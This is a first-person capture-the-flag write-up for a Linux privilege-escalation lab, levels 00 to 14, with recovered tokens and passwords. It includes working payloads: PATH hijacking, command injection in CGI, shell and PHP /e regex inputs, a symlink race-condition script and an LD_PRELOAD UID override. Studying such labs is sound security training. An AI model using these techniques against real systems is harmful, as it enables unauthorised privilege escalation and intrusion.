# Level00
I had to find a SUID of the user flag00 so I used the command "find / -perm
-4000 2>/dev/null" in order to find SUIDs and I found one at the path:
	/bin/.../flag00
So I executed it, changed to the user flag00 and ran getflag to finish the level.

# Level01
In the source code the program sets the UID and GUID to those of flag01
and runs the following line:
	system("/usr/bin/env echo and now what?");
The vulnerability here is that the program doesn't use the full path of echo, 
which means it searches for the binary according to the $PATH variable, hence
making it possible for me to execute whatever I want. In that case I added the
directory /home/level01 at the beginning, added a shell script named "echo" that
spawns a shell and executed the program. This granted me a shell as flag01.

# Level02
The program takes the environment variable of $USER, formats it into the string
"/bin/echo %s is so cool" and executes it using system(). In order to spawn a 
shell, I set $USER to \`/bin/bash\`. The ` around /bin/bash mean that it needs
to be evaluated, which causes the program to execute /bin/bash, thus spawning
a shell as flag02.

# Level03
In the level, there is a cron that iterates over a directory and executes every
file in it. I created a shell script that contained the following command:
	getflag > /home/flag03/output
and after a couple of minutes, the output file was created and contained the 
correct output.

# Level04
The program in this level receives a path to a file and prints its contents.
However, if the path contains the string "token" it doesn't print it. 
The solution is to create a symlink to the token file, F.E by this command:
	ln -s /home/level04/link /home/flag04/token
and by executing the flag04 program with the path of the symlink.
This produces the following token:
	06508b5e-8909-4f38-b630-fdb148a848a2

# Level05
In this level I looked at the home directory and at first glance it looked
empty. I used ls -la and saw that I couldn't cd into any folder but the .backup 
so I looked in it and there was a tgz file. I unzipped it using 
tar xvzf <filename> -C <output> and inside the output dir there was a .ssh
folder that contained a private key for flag05. I wrote it to a file and used
ssh -i priv_key flag05@<ip> and I was logged into flag05. I used getflag and it
executed successfully.

# Level06
In this level the hint was that the user uses a legacy unix system for his 
account credentials. I looked in the /etc/passwd and saw that it contained some
sort of a hash as his password. I copied the line for his user and pasted it in
JohnTheRipper and it cracked it as "hello". I used su to log into flag06 with
"hello" as the password and I was logged in. I ran getflag and it ran successfully.

# Level07
In this level we have a cgi file. The file is served by the thttpd dameon with 
the config file of thttpd.conf, which says it listens on port 7007.
The file receives a Host parameter and formats it into the string:
"ping -c 3 {}". This could be exploited for code injection by ending the line
 with a "|" sign and injecting our own code. I browsed to the following link:
	192.168.80.130:7007/index.cgi?Host=127.0.0.1 | getflag
Which executed successfully.

# Level08
In this level we have a pcap file. I downloaded it, opened it in Wireshark and
looked at the TCP stream. We see an authentication process, where the password
is backd00Rmate. I used it for flag08 and was logged in successfully. I ran
getflag and moved on.

# Level09
This program is a wrapper of a PHP code snippet. This snippet takes a path to a file,
reads its content and looks for the following regex pattern:
	/(\[email (.*)\])/
which is the word "email" in square brackets with a space after it and optionally everything after the space.
When it sees this pattern it replaces the email and brackets part of the string with whatever came after the space and calls a function on it. F.E:
	"[email abcd]" -> "spam('abcd')"
The spam() function replaces the "@" sign with the word AT and . with the word "dot".
The vulnerability in the code is that the first regex (the [email ] one) is done with preg_replace with the "e" flag after the expression. It looks like this:
	/(\[email (.*)\])/e
Which means that whatever comes after the replacement will be evaluated. My goal was to make the result include my own code.
At first I wanted to inject code by closing the spam() function and adding a system() call but every quote (double or single) are escaped so that wasn't possible.
My solution was formatting a string with curly brackets and adding `` around my desired code.
The file I used looked like this:
	[email ${`getflag`}]
Which resulted in the execution of getflag.

# Level10
This level contains a program that takes an IP and a file. It checks if the user can open the file and if he can, it sends its contents over a 
socket to the given IP to port 18211. The vulnerability is in the use of the access() system call. The problem is that the program checks if the user can open the file and only later tries to open the file. This could be
exploited by a race condition where access() is called on a file that I have permissions to and then I immediately swap the file with a symlink to the token.
This causes the program to check the permissions to one file and read another.
I wrote a shell script with the following lines:
	
	#!/bin/sh
	n=1
	while [ $n -le 10000 ]
	do
		echo "abc" > /tmp/link
		ln /home/flag10/token /tmp/link -sf
		n=$(( n+1 ))
		rm /tmp/link
	done

and I ran the program with the following command:
	/home/flag10/flag10 /tmp/link 192.168.80.1
After a few tries I received the following token:
	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

# Level11
This level has a program that receives input from the user. If the length of the
input is less than 1024, it will generate a (psuedo) random string and will
execute it. If it is longer than 1024, the program will generate a random string,
try to open it as a file and write the input of the user to it. Upon playing with
the first option I noticed that if I put a Content-Length of 1 and write ` as the content,
Every couple of tries it tries to execute the character "a". In order to use it I
added the /tmp directory to the path variable and created a symlink named "a" to
the getflag binary. After a couple of runs it executed getflag successfully.

# Level12
In this level we have a Lua script that listens on 127.0.0.1:50001. It prompts the
client for a password and then it echoes it into sha1sum and compares it to another
value. If they are equal it would print a token and if they aren't it wouldn't.
The vulnerability here is that the user input is just executed without sanitaion
so I was able to just execute commands by finishing the echo command with a ";", 
put my commands and finish it with a comment (so the sha1sum part wouldn't execute).
I put the following password:
	abc; getflag > /tmp/flag12 #
and when I opened flag12 I saw that getflag was executed successfully.

# Level13
In this level we have a program that checks the user's UID. If it is equal to 1000,
the program prints the token and if it isn't, the program exits. After a bit of
research it seemed like I can't fool the getuid() function directly so the method
I used is by changing LD_PRELOAD, which is an environment variable program use when
looking for .so files. I compiled my own .so file with the following content:

	#include <unistd.h>
	#include <sys/types.h>

	uid_t getuid(){
	    return 1000;
	}

I compiled it with the following line:
	gcc -shared -fPIC uid.c -o uid.so
and I attempted to run flag13 with LD_PRELOAD set to uid.so but it failed. After
research I found out that the LD_PRELOAD trick doesn't work with SUID files so I
made a copy of flag13 and executed it with my .so file and it worked and I got the following token:
	b705702b-76a8-42b0-8844-3adabbe5ac58

# Level14
In this level we have a program that encrypts user input and we have a token that
we need to decrypt. In order to understand the "encryption" algorithm I inserted a
single "a" in multiple lines and it seemed to increase based on the line number.
After that I inserted multiple "a"'s in a single line and it turned into the ABC,
which meant that the encryption is just adding the index of the character to its
ASCII value. In order to decrypt it I just subtracted the index of the character from
its value using the following snippet:

	token = '857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.'
	for i, char in enumerate(token):
	    print chr(ord(char) - i)

which resulted in the following token:
	8457c118-887c-4e40-a5a6-33a25353165
After that I logged into flag14 to make sure it was the correct token and indeed,
it was.

#Level15

